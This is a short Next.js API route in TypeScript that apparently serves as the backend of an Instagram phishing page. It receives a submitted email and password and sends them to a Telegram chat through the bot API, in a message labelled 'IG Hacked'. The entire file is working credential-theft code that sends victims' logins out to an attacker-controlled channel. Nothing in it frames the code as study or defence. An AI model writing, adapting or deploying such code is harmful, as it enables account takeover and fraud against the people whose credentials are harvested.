import { NextResponse, NextRequest } from 'next/server';

export async function POST(request: NextRequest) {
  try {
    const { email, password } = await request.json();

    if (!email || !password) {
      return NextResponse.json(
        { success: false, msg: 'All inputs are required.' },
        { status: 400 }
      );
    }

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    const message = `📷 IG Hacked\n📧 Email: ${email}\n🔑 Password: ${password}`;

    const response = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      }
    );

    const data = await response.json();
    if (!data.ok) throw new Error(data.description);

    return NextResponse.json({ success: true }, { status: 200 });
  } catch (error) {
    console.error('❌ Telegram Error:', error);
    return NextResponse.json(
      { success: false, msg: 'Failed to send message' },
      { status: 500 }
    );
  }
}